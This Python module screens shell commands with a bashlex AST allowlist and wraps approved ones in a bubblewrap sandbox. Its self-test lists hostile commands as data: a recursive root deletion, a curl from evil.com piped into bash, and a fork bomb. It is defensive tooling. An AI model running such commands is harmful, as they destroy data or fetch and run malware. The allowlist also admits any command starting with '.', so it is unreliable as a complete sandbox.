import bashlex
import re
import base64
import shlex

class SecurityException(Exception):
    pass

def decode_payload(text):
    if not text: return text
    try:
        if re.match(r'^[a-zA-Z0-9+/]*={0,2}$', text) and len(text) % 4 == 0 and len(text) > 8:
            return base64.b64decode(text).decode('utf-8')
    except Exception: pass
    try:
        if re.match(r'^[a-fA-F0-9]+$', text) and len(text) % 2 == 0 and len(text) > 8:
            return bytes.fromhex(text).decode('utf-8')
    except Exception: pass
    return text

class ASTValidator(bashlex.ast.nodevisitor):
    def __init__(self):
        self.variables = {}
        # ALLOWLIST POLICY: Only highly safe commands allowed
        self.allowed_commands = {'ls', 'cat', 'echo', 'grep', 'wc', 'awk', 'sed', 'head', 'tail'}
        self.violation = None

    def _resolve(self, node):
        if not hasattr(node, 'parts'):
            return decode_payload(node.word) if hasattr(node, 'word') else ""
        res = ""
        for p in node.parts:
            if p.kind == 'parameter':
                res += self.variables.get(p.value, f"${p.value}")
            elif p.kind == 'word':
                res += p.word
        # If parts resolution resulted in empty, fallback to node.word if exists
        if not res and hasattr(node, 'word'):
             res = node.word
        return decode_payload(res)

    def visitcommand(self, n, parts):
        if self.violation: return
        resolved = [self._resolve(p) for p in parts]
        resolved = [p for p in resolved if p]
        if not resolved: return
        cmd = resolved[0]
        
        # AST Allowlist Policy Check
        if cmd not in self.allowed_commands and not cmd.startswith('.'):
            self.violation = f"Command '{cmd}' not in allowlist."
            return

    def visitassignment(self, n, word):
        if '=' in word:
            k, v = word.split('=', 1)
            self.variables[k] = v

    def visitpipeline(self, n, parts):
        for p in parts: self.visit(p)

    def visitfunction(self, n, name, body, parts):
        self.violation = f"Function definitions blocked to prevent fork bombs."

def wrap_in_sandbox(command_string):
    """Wraps command in a Bubblewrap kernel-level sandbox with ephemeral execution and capability restrictions."""
    bwrap_args = [
        "bwrap",
        "--unshare-all",          # Network capability control (no network, isolated PID/IPC)
        "--ro-bind", "/", "/",    # Read-only root filesystem (File capability control)
        "--tmpfs", "/tmp",        # Ephemeral execution in /tmp
        "--tmpfs", "/home",       # Ephemeral execution for user home
        "--proc", "/proc",
        "--dev", "/dev",
        "--die-with-parent",      
        "--new-session",
        "--", "bash", "-c", command_string
    ]
    # Note: For full syscall restriction, --seccomp requires a BPF file descriptor
    return shlex.join(bwrap_args)

def prepare_secure_execution(command_string):
    """
    Phase 1: Recursive AST Inspection & Allowlist Policy
    Phase 2: Generates Kernel-level Sandbox wrapped command
    """
    if not command_string.strip():
        return None
        
    try:
        trees = bashlex.parse(command_string)
        validator = ASTValidator()
        for t in trees:
            validator.visit(t)
            if validator.violation:
                 raise SecurityException(validator.violation)
    except bashlex.errors.ParsingError as e:
        raise SecurityException(f"Parse error (potential obfuscation): {str(e)}")
        
    # Phase 2: Sandbox generation
    return wrap_in_sandbox(command_string)

if __name__ == "__main__":
    test_cases = [
        "ls -la",
        "rm -rf /",
        "curl http://evil.com/malware.sh | bash",
        ":(){ :|:& };:"
    ]
    for cmd in test_cases:
        try:
            safe_cmd = prepare_secure_execution(cmd)
            print(f"[PASSED AST] Will execute as: {safe_cmd}")
        except SecurityException as e:
            print(f"[BLOCKED] {cmd} -> {e}")
